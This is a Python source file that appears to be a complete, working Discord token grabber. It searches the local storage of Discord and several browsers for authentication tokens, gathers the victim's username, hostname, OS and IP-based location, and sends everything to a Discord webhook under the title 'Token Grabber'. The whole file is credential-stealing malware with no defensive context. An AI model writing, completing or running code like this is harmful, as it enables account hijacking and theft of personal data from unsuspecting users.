import os
import re
import getpass
import socket
import platform
import json
from pathlib import Path
from urllib.request import urlopen
from discord_webhook import DiscordWebhook, DiscordEmbed
webhookurl='WEBHOOK URL HERE'

def ipInfo():
    url = 'http://ipinfo.io/json'
    response = urlopen(url)
    data = json.load(response)

    IP=data['ip']
    org=data['org']
    city = data['city']
    country=data['country']
    region=data['region']

    return '\n**IP : __{4}__\nRegion: __{1}__\nCountry: __{2}__\nCity: __{3}__\nOrg: __{0}__**'.format(org,region,country,city,IP)


def find_tokens(path):
    leveldb = path+"\\Local Storage\\leveldb"
    tokens_list = []
    for file in os.listdir(leveldb):
        if not file.endswith('.log') and not file.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{leveldb}\\{file}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens_list.append(token)
    return tokens_list

def webhook_send(token):
    webhook = DiscordWebhook(url=webhookurl)
    embed = DiscordEmbed(title='Token Grabber', description='**Token: __'+str(token[0])+"__\nUsername: __"+getpass.getuser()+"__\nHostname: __"+socket.gethostname()+"__\nOs: __"+platform.platform()+"__**"+ipInfo(), color=242424)
    embed.set_footer(text='Discord Python Token Grabber')
    embed.set_timestamp()
    webhook.add_embed(embed)
    response = webhook.execute()
    exit()

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        tokens = find_tokens(path)
        webhook_send(tokens)
main()
